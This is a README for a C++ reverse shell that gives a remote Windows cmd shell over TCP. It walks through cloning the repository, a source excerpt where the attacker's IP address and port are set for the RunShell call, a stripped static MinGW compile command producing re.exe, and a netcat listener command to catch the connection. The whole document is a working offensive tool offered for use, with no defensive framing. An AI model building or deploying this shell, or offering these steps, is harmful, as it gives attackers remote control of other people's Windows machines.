# C ++ Reverse Shell

This is a simple C++ based reverse shell give us a windows  cmd shell over TCP .  


## installation

    $ apt install mingw-w64
    $ git clone https://github.com/dev-frog/C-Reverse-Shell.git
    $ cd C-Reverse-Shell
  


##  change The IP and Port number in the source code

There is **re.cpp** file you have to open and change the **ip address** and **port number**

![alt text](https://github.com/dev-frog/C-Reverse-Shell/blob/master/img/re.PNG)

    70 else {
    71    char host[] = "192.168.0.101";  // change this to your ip address
    72    int port = 4444;                //chnage this to your open port
    73    RunShell(host, port);
    74}
    


## Compile it

    i686-w64-mingw32-g++ re.cpp -o re.exe -lws2_32 -lwininet -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc

## Start  the netcat Listener
 

     nc -lvnp <port number>

